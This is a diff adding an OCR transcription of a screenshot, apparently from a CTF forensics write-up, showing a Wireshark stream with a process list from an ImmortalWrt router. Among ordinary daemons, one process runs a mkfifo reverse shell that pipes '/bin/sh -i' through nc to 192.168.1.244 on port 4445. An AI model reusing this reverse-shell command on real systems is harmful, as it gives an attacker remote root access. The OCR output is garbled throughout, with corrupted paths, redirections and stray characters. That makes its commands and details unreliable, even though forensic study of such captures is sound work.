@@ -1,0 +1,47 @@
+# OCR: 8046799831100c351cc397135b701bf9.webp
+# 来源: .\02-WriteUp\2025\8046799831100c351cc397135b701bf9.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:31
+
+(Mi Wireshark 88% TCP i (tcp.stream eq 0) - FEREL.pcap - ax
+1231 root 9 SW [napi/phyo-11] *
+1232 root @ Su [napi/phy@-12]
+1263 root 9 SW [mt76-tx plye]
+.[6 1286 root 8 Me [kworker/R-fullc]
+1486 logd 2864 5 /sbin/logd -5 128
+-~.FO 1540 root 4504 5 /sbin/rpcd -s /var/run/ubus/ubus.sock -t 30
+2090 root 2852 S {hostapd} /sbin/ujail -t 5 -n hostapd -U network -6 network -C /etc/capabilities/wpad.json -c -- /u
+2091 root 2852 5 {wpa_supplicant} /sbin/ujail -t 5 -n wpa_supplicant -U network -G network -C /etc/capabilities/wpad
+心 . 2116 network 9956 5 —_/usr/sbin/wpa_supplicant -n -s -g /var/run/wpa_supplicant/global
+2117 network 10820 5 — /usr/sbin/hostapd -s -g /var/run/hostapd/global
+sy. 2155 root 2556 5 /sbin/netifd
+2194 root 。 12S8m 5 /usrybindockerd --iptables-false =
+2274 root 1344 S /bin/sh -c mkfifo /tmp/f 2>/dev/null; cat /tmp/f | /bin/sh -i 2>81 | nc 192.168.1.244,EZEB> /tmp/#
+2276 root 1336 5 cat /tnp/f
+2277 root 248 s /bin/sh -i
+2278 root 1336S pe 192.168.1.244 4445
+2375 root 1644 5 /usr/sbin/odhepd
++40 2405 root 8 Me [kworker/1:2H]
+… 2501 root 1988 5 /usr/sbin/uhttpd - -h /www - ImmortalWirt -x /cgi-bin -u /ubus -t 60 -T 30 -k 20 -A - 3 -N 100
+2566 root 1288 S /usrysbinyysftpd -olisten_address=0.0.0.0 -olisten-YES -olisten_ipv6-NO /var/run/vsftpd/vsftpd.conf
+2603 root 1892 5 /usr/bin/dbus-daemon --system --nofork
+2711 nobody 2348 S avahi-daemon: running [InmortalWrt.local]
+3204 root 1132 5 /usrysbiyropbear -F -P /var/run/dropbear.1.pid -p 192.168.1.1:22 -p fd5I
+226 3205 root 1132 5 /usr/sbinydropbear -F -P /var/run/dropbear.2.pid -p 222 - 300 -T 3 -W 262144
+3509 root 1344S ash -c export LANG="en_US";export LANGUAGE="en_US";export LC_ALL="en_US";freesecho finalshell_separ
+3514 root 1336S sleep 1
+…6 3515 root 1344 8 ps
+3547 root 2852 5 fntpd} /sbin/ujail -t 5 -n ntpd -U ntp -6 ntp -C /etc/capabilities/ntpd.json -c -u -r /bin/ubus -
++> 60 3584 ntp 12336 5 /usr/sbin/ntpd -n -N -S /usr/sbin/ntpd-hotplug -p ntp.tencent.com -p ntpl.aliyun.com -p ntp.ntsc.ac
+3833 root «24780 0 /usrybinyttyd -i br-lan /bin/login.~..0
+3974 root 1248m 5 containerd --config /var/run/docker/containerd/containerd.toml --log-level warn
+4007 root 2852 5 {dnsmasq} /sbin/ujail 一 5 -n dnsmasq -u -1 -r /bin/ubus -r /etc/TZ - /etc/dnsmasq.conf -r /etc/et
+心 . 4025 dnsmasq “5628 5 /usr/sbin/dnsmasq -C /var/etc/dnsmasq.conf.cfg0141ic -k -x /var/run/dnsmasq/dnsmasq.cfg01411c.pid
+6055 root @ IW —[kworker/0:1-eve]
+6377 root 1468S —_/bin/login
++10 6379 root 2356 5 -ash
+心 .6 6639 root 16652 5 Mpa_supplicant -8 -i wlan -c /tmp/wpa_supplicant.conf
+6766 root @ IW _[kworker/1:1-mm_] 、
+P85 307304, 302 BAIR HS, 226 BE DG, 444 tums RE
+SATE (16 kB) 口 5 (ASCH 引
+E
